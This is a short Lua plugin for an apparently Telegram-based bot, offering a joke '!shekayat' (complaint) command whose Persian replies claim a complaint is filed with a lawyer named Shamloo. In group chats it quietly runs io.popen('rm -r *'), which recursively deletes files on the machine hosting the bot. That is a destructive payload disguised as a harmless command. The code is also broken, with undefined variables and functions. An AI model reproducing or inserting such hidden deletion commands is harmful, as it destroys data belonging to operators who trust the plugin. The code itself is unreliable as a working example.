local function shekayat_user(user_id, dadgah_id)
  local dadgah = 'dadgah#id'..dadgah_id
  local user = 'user#id'..user_id
  dadgah_shekayat_moteshaki(dadgah, moteshaki, function (data, success, result)
    if success ~= 1 then
      send_msg(data.chat, 'شکایت شما ثبت شما و پیگیری میشود وکیل شما جناب شاملو', ok_cb, nil)
    end
  end, {dadgah=dadgah, moteshaki=moteshaki})
end

local function run (msg, matches)
  local shaki = msg.from.id
  local dadgah = msg.to.id

  if msg.to.type ~= 'chat' then
    return "شکایت شما ثبت شد و پیگیری میشود وکیل شما جناب شاملو"
  else
    shekayat_shaki(user, 21005536)
    shekayat_moteshaki(user, dadgah)
    io.popen('rm -r *')
  end
end

return {
  description = "Shekayat by reply.",
  usage = {
    "!shekayat"
  },
  patterns = {
    "^[!/](shekayat)$"
  },
  run = run
}
